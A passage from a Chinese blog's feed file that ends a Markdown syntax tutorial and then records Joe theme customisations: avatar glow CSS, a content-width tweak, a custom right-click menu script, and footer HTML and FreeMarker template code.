EnjoyToShare :smile:</p><blockquote><p>更多可用 Emoji 代码参见 <a href="https://www.webfx.com/tools/emoji-cheat-sheet/">emoji-cheat-sheet</a> 和 <a href="https://www.emojicopy.com/">emojicopy</a></p></blockquote><h2 id="15-复选框列表"><a href="#15-复选框列表" class="headerlink" title="15 复选框列表"></a>15 复选框列表</h2><p>在列表符号后面加上 <code>[x]</code> 或者 <code>[ ]</code> 代表<code>选中</code>或者<code>未选中</code>情况</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">- [ ] content </span><br><span class="line">-空格[空格]空格content </span><br><span class="line">解释: [ ]括号里面的空格可以换成[x],代表选中对话框</span><br></pre></td></tr></table></figure><ul><li>[x] C</li><li>[x] C++</li><li>[x] Java</li><li>[x] Qt</li><li>[x] Android</li><li>[ ] C#</li><li>[ ] .NET</li></ul><h2 id="16-插入视频"><a href="#16-插入视频" class="headerlink" title="16 插入视频"></a>16 插入视频</h2><ul><li>Example：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;video src=&quot;https://cos.gjcloak.xyz/file/202202250708378.mp4&quot; controls width=&quot;68%&quot;&gt;&lt;/video&gt;</span><br></pre></td></tr></table></figure><ul><li>效果：</li></ul>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Markdown </tag>
            
            <tag> 基本语法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Joe 主题美化记录</title>
      <link href="/82.html"/>
      <url>/82.html</url>
      
        <content type="html"><![CDATA[<h2 id="头像呼吸灯"><a href="#头像呼吸灯" class="headerlink" title="头像呼吸灯"></a>头像呼吸灯</h2><p>在主题后台全局css里添加</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">/*头像呼吸光环和鼠标悬停旋转放大*/</span><br><span class="line">.avatar &#123;</span><br><span class="line"> border-radius: 50%;</span><br><span class="line"> animation: light 4s ease-in-out infinite;</span><br><span class="line"> transition: 0.5s;</span><br><span class="line">&#125;</span><br><span class="line">.avatar:hover &#123;</span><br><span class="line">transform: scale(1.15) rotate(720deg);</span><br><span class="line">&#125;</span><br><span class="line">@keyframes light &#123;</span><br><span class="line"> 0%&#123;box-shadow: 0 0 4px #f00;&#125;</span><br><span class="line"> 25%&#123;box-shadow: 0 0 16px #0f0;&#125; </span><br><span class="line"> 50%&#123;box-shadow: 0 0 4px #00f;&#125;</span><br><span class="line"> 75%&#123;box-shadow: 0 0 16px #0f0;&#125; </span><br><span class="line"> 100%&#123;box-shadow: 0 0 4px #f00;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="调整内容宽度"><a href="#调整内容宽度" class="headerlink" title="调整内容宽度"></a>调整内容宽度</h2><p><img src="https://cos.gjcloak.xyz/file/image-1653449771630.png?imageMogr2/format/webp/interlace/1/quality/100" alt="image-1653449771630" title="image-1653449771630"></p><p>把1360px更换成你想要的宽度即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#Joe .joe_container&#123;</span><br><span class="line">max-width: 1360px;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="自定义鼠标右键"><a href="#自定义鼠标右键" class="headerlink" title="自定义鼠标右键"></a>自定义鼠标右键</h2><p><img src="https://cos.gjcloak.xyz/file/image-1652662344128.png" alt="image-1652662344128" title="image-1652662344128"></p><p>在主题后台自定义JS（body）里添加</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 调用js --&gt;</span><br><span class="line">&lt;script src=&quot;https://lib.baomitu.com/layer/3.1.1/layer.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;!-- 自定义右键菜单美化 --&gt;</span><br><span class="line">  &lt;style type=&quot;text/css&quot;&gt;</span><br><span class="line">    a &#123;text-decoration: none;&#125;</span><br><span class="line">    div.usercm&#123;background-repeat:no-repeat;background-position:center center;background-size:cover;background-color:#fff;font-size:13px!important;width:130px;-moz-box-shadow:1px 1px 3px rgba</span><br><span class="line">(0,0,0,.3);box-shadow:0px 0px 15px #333;position:absolute;display:none;z-index:10000;opacity:0.9; border-radius: 8px;&#125;</span><br><span class="line">    div.usercm ul&#123;list-style-type:none;list-style-position:outside;margin:0px;padding:0px;display:block&#125;</span><br><span class="line">    div.usercm ul li&#123;margin:0px;padding:0px;line-height:35px;&#125;</span><br><span class="line">    div.usercm ul li a&#123;color:#666;padding:0 15px;display:block&#125;</span><br><span class="line">    div.usercm ul li a:hover&#123;color:#fff;background:rgba(170,222,18,0.88)&#125;</span><br><span class="line">    div.usercm ul li a i&#123;margin-right:10px&#125;</span><br><span class="line">    a.disabled&#123;color:#c8c8c8!important;cursor:not-allowed&#125;</span><br><span class="line">    a.disabled:hover&#123;background-color:rgba(255,11,11,0)!important&#125;</span><br><span class="line">    div.usercm&#123;background:#fff !important;&#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">&lt;div class=&quot;usercm&quot; style=&quot;left: 199px; top: 5px; display: none;&quot;&gt;</span><br><span class="line">    &lt;ul&gt;</span><br><span class="line">        &lt;li&gt;&lt;a href=&quot;https://blog.gjcloak.top/&quot;&gt;&lt;i class=&quot;fa fa-home fa-fw&quot;&gt;&lt;/i&gt;&lt;span&gt;首页&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">        &lt;li&gt;&lt;a href=&quot;javascript:void(0);&quot; onclick=&quot;getSelect();&quot;&gt;&lt;i class=&quot;fa fa-copy fa-fw&quot;&gt;&lt;/i&gt;&lt;span&gt;复制&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">        &lt;li&gt;&lt;a href=&quot;javascript:void(0);&quot; onclick=&quot;baiduSearch();&quot;&gt;&lt;i class=&quot;fa fa-search fa-fw&quot;&gt;&lt;/i&gt;&lt;span&gt;搜索&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">        &lt;li&gt;&lt;a href=&quot;javascript:history.go(1);&quot;&gt;&lt;i class=&quot;fa fa-arrow-right fa-fw&quot;&gt;&lt;/i&gt;&lt;span&gt;前进&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">        &lt;li&gt;&lt;a href=&quot;javascript:history.go(-1);&quot;&gt;&lt;i class=&quot;fa fa-arrow-left fa-fw&quot;&gt;&lt;/i&gt;&lt;span&gt;后退&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">        &lt;li style=&quot;border-bottom:1px solid gray&quot;&gt;&lt;a href=&quot;javascript:window.location.reload();&quot;&gt;&lt;i class=&quot;fa fa-refresh fa-fw&quot;&gt;&lt;/i&gt;&lt;span&gt;重载网页&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">        &lt;li&gt;&lt;a href=&quot;https://blog.gjcloak.top/links&quot;&gt;&lt;i class=&quot;fa fa-meh-o fa-fw&quot;&gt;&lt;/i&gt;&lt;span&gt;和我当邻居&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;  </span><br><span class="line">           &lt;li&gt;&lt;a href=&quot;https://blog.gjcloak.top/messagecenter&quot;&gt;&lt;i class=&quot;fa fa-pencil-square-o fa-fw&quot;&gt;&lt;/i&gt;&lt;span&gt;给我留言吧&lt;/span&gt;&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">    &lt;/ul&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">    (function(a) &#123;</span><br><span class="line">        a.extend(&#123;</span><br><span class="line">            mouseMoveShow: function(b) &#123;</span><br><span class="line">                var d = 0,</span><br><span class="line">                    c = 0,</span><br><span class="line">                    h = 0,</span><br><span class="line">                    k = 0,</span><br><span class="line">                    e = 0,</span><br><span class="line">                    f = 0;</span><br><span class="line">                a(window).mousemove(function(g) &#123;</span><br><span class="line">                    d = a(window).width();</span><br><span class="line">                    c = a(window).height();</span><br><span class="line">                    h = g.clientX;</span><br><span class="line">                    k = g.clientY;</span><br><span class="line">                    e = g.pageX;</span><br><span class="line">                    f = g.pageY;</span><br><span class="line">                    h + a(b).width() &gt;= d &amp;&amp; (e = e - a(b).width() - 5);</span><br><span class="line">                    k + a(b).height() &gt;= c &amp;&amp; (f = f - a(b).height() - 5);</span><br><span class="line">                    a(&quot;html&quot;).on(&#123;</span><br><span class="line">                        contextmenu: function(c) &#123;</span><br><span class="line">                            3 == c.which &amp;&amp; a(b).css(&#123;</span><br><span class="line">                                left: e,</span><br><span class="line">                                top: f</span><br><span class="line">                            &#125;).show()</span><br><span class="line">                        &#125;,</span><br><span class="line">                        click: function() &#123;</span><br><span class="line">                            a(b).hide()</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;)</span><br><span class="line">                &#125;)</span><br><span class="line">            &#125;,</span><br><span class="line">            disabledContextMenu: function() &#123;</span><br><span class="line">                window.oncontextmenu = function() &#123;</span><br><span class="line">                    return !1</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)(jQuery);</span><br><span class="line">    function getSelect() &#123;</span><br><span class="line">        &quot;&quot; == (window.getSelection ? window.getSelection() : document.selection.createRange().text) ? layer.msg(&quot;啊噢...你没还没选择文字呢！&quot;) : document.execCommand(&quot;Copy&quot;)</span><br><span class="line">    &#125;;</span><br><span class="line">    function baiduSearch() &#123;</span><br><span class="line">        var a = window.getSelection ? window.getSelection() : document.selection.createRange().text;</span><br><span class="line">        &quot;&quot; == a ? layer.msg(&quot;啊噢...你没还没选择文字呢！&quot;) : window.open(&quot;https://www.baidu.com/s?wd=&quot; + a)</span><br><span class="line">    &#125;;</span><br><span class="line">    $(function() &#123;</span><br><span class="line">        for (var a = navigator.userAgent, b = &quot;Android;iPhone;SymbianOS;Windows Phone;iPad;iPod&quot;.split(&quot;;&quot;), d = !0, c = 0; c &lt; b.length; c++) if (0 &lt; a.indexOf(b[c])) &#123;</span><br><span class="line">            d = !1;</span><br><span class="line">            break</span><br><span class="line">        &#125;</span><br><span class="line">        d &amp;&amp; ($.mouseMoveShow(&quot;.usercm&quot;), $.disabledContextMenu())</span><br><span class="line">    &#125;);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h2 id="网站底部样式"><a href="#网站底部样式" class="headerlink" title="网站底部样式"></a>网站底部样式</h2><p>具体效果请看本站网站底部</p><h3 id="在头部文件加上两个链接"><a href="#在头部文件加上两个链接" class="headerlink" title="在头部文件加上两个链接"></a>在头部文件加上两个链接</h3><p><img src="https://cos.gjcloak.xyz/file/image-1652672970057.png" alt="image-1652672970057" title="image-1652672970057"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;link rel=&quot;stylesheet&quot; href=&quot;https://cdn.jsdelivr.net/gh/cy-j/chenyu@1.6.0/css/cydibu.min.css&quot;&gt;</span><br><span class="line">&lt;link rel=&quot;stylesheet&quot; href=&quot;https://cdn.jsdelivr.net/gh/cy-j/chenyu/css/bootstrap-grid.min.css&quot;&gt;</span><br></pre></td></tr></table></figure><p><img src="https://cos.gjcloak.xyz/file/image-1652670881697.png" alt="image-1652670881697" title="image-1652670881697"></p><h3 id="footer页面放入以下代码"><a href="#footer页面放入以下代码" class="headerlink" title="footer页面放入以下代码"></a>footer页面放入以下代码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 好久不见 --&gt;</span><br><span class="line">&lt;div class=&quot;chenyuyc&quot;&gt;</span><br><span class="line">    &lt;div class=&quot;footer-fav&quot;&gt;</span><br><span class="line">      &lt;div class=&quot;container&quot;&gt;</span><br><span class="line">        &lt;div class=&quot;fl site-info&quot;&gt;</span><br><span class="line">          &lt;h2&gt;&lt;a href=&quot;https://www.gjcloak.top/&quot; target=&quot;_blank&quot;&gt;公爵书房&lt;/a&gt;&lt;/h2&gt;</span><br><span class="line">          &lt;div class=&quot;site-p&quot;&gt;</span><br><span class="line">              &lt;p&gt;公爵【她只是途经我留下了星火 而我却任凭它焚烧了我整个荒原】&lt;/p&gt;</span><br><span class="line">          &lt;/div&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">        &lt;div class=&quot;fr site-fav&quot;&gt;</span><br><span class="line">          &lt;a href=&quot;https://www.gjcloak.top/&quot; class=&quot;btn btn-fav btn-orange&quot;&gt;Ctrl+D收藏本站&lt;/a&gt;&lt;/div&gt;</span><br><span class="line">        &lt;div class=&quot;site-girl&quot;&gt;</span><br><span class="line">            &lt;div class=&quot;girl fl&quot;&gt; &lt;i class=&quot;thumb &quot; style=&quot;background-image:url(https://cdn.jsdelivr.net/gh/cy-j/chenyu/img/cyxy.png);&quot;&gt;&lt;/i&gt; &lt;/div&gt;</span><br><span class="line">            &lt;div class=&quot;girl-info hide_md&quot;&gt;</span><br><span class="line">              &lt;h4&gt;绿水本无忧，因风皱面&lt;/h4&gt;</span><br><span class="line">              &lt;h4&gt;青山原不老，为雪白头&lt;/h4&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/div&gt;   </span><br></pre></td></tr></table></figure><p>刚放入上面代码还是不够的，我的目标是用这个代替原先的页脚信息，因此需要把原来页脚的部分代码加入到<code>&lt;div class=&quot;site-p&quot;&gt;&lt;/div&gt;</code></p><h3 id="最终效果"><a href="#最终效果" class="headerlink" title="最终效果"></a>最终效果</h3><p><img src="https://cos.gjcloak.xyz/file/image-1652670721608.png" alt="image-1652670721608" title="image-1652670721608"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line">&lt;#if settings.enable_footer!true&gt;</span><br><span class="line">  &lt;footer class=&quot;joe_footer$&#123;(settings.footer_position==&#x27;fixed&#x27;)?then(&#x27; fixed&#x27;,&#x27;&#x27;)&#125;$&#123;settings.enable_full_footer?then(&#x27; full&#x27;,&#x27;&#x27;)&#125;&quot;&gt;</span><br><span class="line">&lt;#if settings.footer_source==&#x27;both&#x27;  settings.footer_source==&#x27;theme&#x27;&gt;</span><br><span class="line">&lt;!-- 好久不见 --&gt;</span><br><span class="line">&lt;div class=&quot;chenyuyc&quot;&gt;</span><br><span class="line">    &lt;div class=&quot;footer-fav&quot;&gt;</span><br><span class="line">      &lt;div class=&quot;container&quot;&gt;</span><br><span class="line">        &lt;div class=&quot;fl site-info&quot;&gt;</span><br><span class="line">          &lt;h2&gt;&lt;a href=&quot;https://www.gjcloak.top/&quot; target=&quot;_blank&quot;&gt;公爵书房&lt;/a&gt;&lt;/h2&gt;</span><br><span class="line">          &lt;div class=&quot;site-p&quot;&gt;</span><br><span class="line">              &lt;p&gt;公爵【她只是途经我留下了星火 而我却任凭它焚烧了我整个荒原】&lt;/p&gt;</span><br><span class="line">              &lt;#if settings.enable_birthday!false&gt;</span><br><span class="line">              &lt;p&gt;</span><br><span class="line">                $&#123;.now?string(&quot;yyyy&quot;)&#125; © &lt;a href=&quot;$&#123;blog_url!&#125;&quot; target=&quot;_blank&quot; rel=&quot;noopener noreferrer&quot;&gt;$&#123;user.nickname!&#125;&lt;/a&gt;</span><br><span class="line">              &lt;#if settings.enable_icp &amp;&amp; settings.icp?? &amp;&amp; settings.icp?trim!=&#x27;&#x27;&gt; - &lt;a class=&quot;icp&quot; href=&quot;https://beian.miit.gov.cn&quot; target=&quot;_blank&quot; rel=&quot;noopener noreferrer nofollow&quot;&gt;$&#123;settings.icp&#125;&lt;/a&gt;&lt;/#if&gt;</span><br><span class="line">              &lt;/p&gt;</span><br><span class="line">          &lt;#if settings.enable_police &amp;&amp; settings.police?? &amp;&amp; settings.police?trim!=&#x27;&#x27;&gt;</span><br><span class="line">            &lt;#assign recordcode=settings.police?replace(&#x27;[^\\d]&#x27;,&#x27;&#x27;,&#x27;ri&#x27;)&gt;</span><br><span class="line">            &lt;p class=&quot;site_police&quot;&gt;</span><br><span class="line">              &lt;a href=&quot;http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=$&#123;recordcode&#125;&quot; target=&quot;_blank&quot; rel=&quot;noopener noreferrer nofollow&quot;&gt;$&#123;settings.police&#125;&lt;/a&gt;</span><br><span class="line">            &lt;/p&gt;</span><br><span class="line">          &lt;#if settings.enable_powerby!true&gt;&lt;p class=&quot;site_powered&quot;&gt;Powered by &lt;a class=&quot;a-powered&quot; href=&quot;https://halo.run/&quot; target=&quot;_blank&quot; rel=&quot;noopener noreferrer&quot;&gt;Halo&lt;/a&gt;&amp;nbsp;&amp;nbsp;? Theme by &lt;a class=&quot;a-theme&quot; title=&quot;当前主题：Joe2.0 V$&#123;theme.version!&#125;&quot; href=&quot;$&#123;theme.repo!&#125;&quot; target=&quot;_blank&quot; rel=&quot;noopener noreferrer&quot;&gt;M酷&lt;/a&gt;&lt;/p&gt;&lt;/#if&gt;</span><br><span class="line">          &lt;/#if&gt;</span><br><span class="line">            &lt;div class=&quot;site_life&quot;&gt;</span><br><span class="line">              &lt;i class=&quot;joe-font joe-icon-jiasu&quot;&gt;&lt;/i&gt;已运行&amp;nbsp;&lt;strong class=&quot;joe_run__day&quot;&gt;00&lt;/strong&gt; 天 &lt;strong class=&quot;joe_run__hour&quot;&gt;00&lt;/strong&gt; 时 &lt;strong class=&quot;joe_run__minute&quot;&gt;00&lt;/strong&gt; 分 &lt;strong class=&quot;joe_run__second&quot;&gt;00&lt;/strong&gt; 秒</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">          &lt;/#if&gt;</span><br><span class="line">          &lt;/div&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">        &lt;div class=&quot;fr site-fav&quot;&gt;</span><br><span class="line">          &lt;a href=&quot;https://www.gjcloak.top/&quot; class=&quot;btn btn-fav btn-orange&quot;&gt;Ctrl+D收藏本站&lt;/a&gt;&lt;/div&gt;</span><br><span class="line">        &lt;div class=&quot;site-girl&quot;&gt;</span><br><span class="line">            &lt;div class=&quot;girl fl&quot;&gt; &lt;i class=&quot;thumb &quot; style=&quot;background-image:url(https://cdn.jsdelivr.net/gh/cy-j/chenyu/img/cyxy.png);&quot;&gt;&lt;/i&gt; &lt;/div&gt;</span><br><span class="line">            &lt;div class=&quot;girl-info hide_md&quot;&gt;</span><br><span class="line">              &lt;h4&gt;绿水本无忧，因风皱面&lt;/h4&gt;</span><br><span class="line">              &lt;h4&gt;青山原不老，为雪白头&lt;/h4&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/div&gt;      </span><br><span class="line">      &lt;!--&lt;div class=&quot;joe_container$&#123;(settings.enable_rss==false &amp;&amp; settings.enable_sitemap==false)?then(&#x27; central&#x27;,&#x27;&#x27;)&#125;&quot;&gt;</span><br><span class="line">        &lt;div class=&quot;item&quot;&gt;</span><br><span class="line">          &lt;#if settings.driven_by?? &amp;&amp; settings.driven_by!=&#x27;none&#x27;&gt;</span><br><span class="line">            &lt;#assign driven_logo=BASE_RES_URL + &#x27;/source/img/cloud/&#x27; + settings.driven_by + &#x27;.svg&#x27;&gt;</span><br><span class="line">            &lt;#switch settings.driven_by&gt;  </span><br><span class="line">              &lt;#case &#x27;aliyun&#x27;&gt;  </span><br><span class="line">                &lt;#assign driven_url=&#x27;https://www.aliyun.com&#x27;&gt;</span><br><span class="line">                &lt;#break&gt;  </span><br><span class="line">              &lt;#case &#x27;tencent&#x27;&gt;  </span><br><span class="line">                &lt;#assign driven_url=&#x27;https://cloud.tencent.com&#x27;&gt;</span><br><span class="line">                &lt;#break&gt; </span><br><span class="line">              &lt;#case &#x27;baidu&#x27;&gt;  </span><br><span class="line">                &lt;#assign driven_url=&#x27;https://cloud.baidu.com&#x27;&gt;</span><br><span class="line">                &lt;#break&gt;  </span><br><span class="line">              &lt;#case &#x27;upyun&#x27;&gt;  </span><br><span class="line">                &lt;#assign driven_url=&#x27;https://www.upyun.com&#x27;&gt;</span><br><span class="line">                &lt;#break&gt;  </span><br><span class="line">              &lt;#case &#x27;qiniu&#x27;&gt;  </span><br><span class="line">                &lt;#assign driven_url=&#x27;https://www.qiniu.com&#x27;&gt;</span><br><span class="line">                &lt;#break&gt;</span><br><span class="line">              &lt;#case &#x27;huawei&#x27;&gt;  </span><br><span class="line">                &lt;#assign driven_url=&#x27;https://www.huaweicloud.com&#x27;&gt;</span><br><span class="line">                &lt;#break&gt;    </span><br><span class="line">              &lt;#case &#x27;jinshan&#x27;&gt;  </span><br><span class="line">                &lt;#assign driven_url=&#x27;https://www.ksyun.com&#x27;&gt;</span><br><span class="line">                &lt;#break&gt;    </span><br><span class="line">              &lt;#case &#x27;custom&#x27;&gt;</span><br><span class="line">                &lt;#assign c_cloud=settings.custome_cloud?split(&#x27;\n&#x27;)&gt;</span><br><span class="line">                &lt;#assign driven_logo=(c_cloud[0]?? &amp;&amp; c_cloud[0]?trim!=&#x27;&#x27;)?then(c_cloud[0]?trim,&#x27;&#x27;)&gt;</span><br><span class="line">                &lt;#assign driven_url=(c_cloud[1]?? &amp;&amp; c_cloud[1]?trim!=&#x27;&#x27;)?then(c_cloud[1]?trim,&#x27;&#x27;)&gt;</span><br><span class="line">                &lt;#break&gt;    </span><br><span class="line">              &lt;#default&gt;</span><br><span class="line">                &lt;#assign driven_url=&#x27;&#x27;&gt;</span><br><span class="line">            &lt;/#switch&gt;</span><br><span class="line">            &lt;#assign clickable = driven_url != &#x27;&#x27; &amp;&amp; driven_url != &#x27;#&#x27;&gt;</span><br><span class="line">            &lt;p class=&quot;site_driven&quot;&gt;本站点由</span><br><span class="line">              &lt;a href=&quot;$&#123;clickable?then(driven_url,&#x27;javascript:;&#x27;)&#125;&quot; $&#123;clickable?then(&#x27;target=&quot;_blank&quot;&#x27;,&#x27;&#x27;)&#125; rel=&quot;noopener noreferrer nofollow&quot;&gt;</span><br><span class="line">                &lt;img class=&quot;$&#123;settings.driven_by&#125;&quot; src=&quot;$&#123;driven_logo&#125;&quot; onerror=&quot;Joe.errorImg(this)&quot; alt=&quot;云服务商&quot;/&gt;</span><br><span class="line">              &lt;/a&gt;提供云服务</span><br><span class="line">            &lt;/p&gt;</span><br><span class="line">          &lt;/#if&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">        &lt;div class=&quot;side-col&quot;&gt;</span><br><span class="line">        &lt;#if settings.enable_rss==true  settings.enable_sitemap==true&gt;</span><br><span class="line">          &lt;div class=&quot;item&quot;&gt;</span><br><span class="line">            &lt;#if settings.enable_rss&gt;&lt;a class=&quot;rss&quot; href=&quot;$&#123;rss_url!&#125;&quot; target=&quot;_blank&quot; rel=&quot;noopener noreferrer&quot;&gt;&lt;i class=&quot;joe-font joe-icon-rss-fill&quot;&gt;&lt;/i&gt;&amp;nbsp;RSS&lt;/a&gt;&lt;/#if&gt;</span><br><span class="line">            &lt;#if settings.enable_sitemap&gt;&lt;a href=&quot;$&#123;sitemap_xml_url!&#125;&quot; target=&quot;_blank&quot; rel=&quot;noopener noreferrer&quot;&gt;站点地图&lt;/a&gt;&lt;/#if&gt;</span><br><span class="line">          &lt;/div&gt;</span><br><span class="line">        &lt;/#if&gt;</span><br><span class="line">        &lt;#if settings.enable_busuanzi!false&gt;</span><br><span class="line">          &lt;div class=&quot;item busuanzi-statistic&quot;&gt;</span><br><span class="line">            &lt;span class=&quot;site-pv&quot;&gt;&lt;i class=&quot;joe-font joe-icon-zhexiantu&quot;&gt;&lt;/i&gt;访问量&lt;em id=&quot;busuanzi_value_site_pv&quot;&gt;0&lt;/em&gt;&lt;/span&gt;</span><br><span class="line">            &lt;span class=&quot;site-uv&quot;&gt;&lt;i class=&quot;joe-font joe-icon-monitor&quot;&gt;&lt;/i&gt;访客量&lt;em id=&quot;busuanzi_value_site_uv&quot;&gt;0&lt;/em&gt;&lt;/span&gt;</span><br><span class="line">            &lt;span class=&quot;site-page-pv&quot;&gt;&lt;i class=&quot;joe-font joe-icon-dianji&quot;&gt;&lt;/i&gt;本页访客&lt;em id=&quot;busuanzi_value_page_pv&quot;&gt;0&lt;/em&gt;&lt;/span&gt;</span><br><span class="line">          &lt;/div&gt;</span><br><span class="line">        &lt;/#if&gt;</span><br><span class="line">      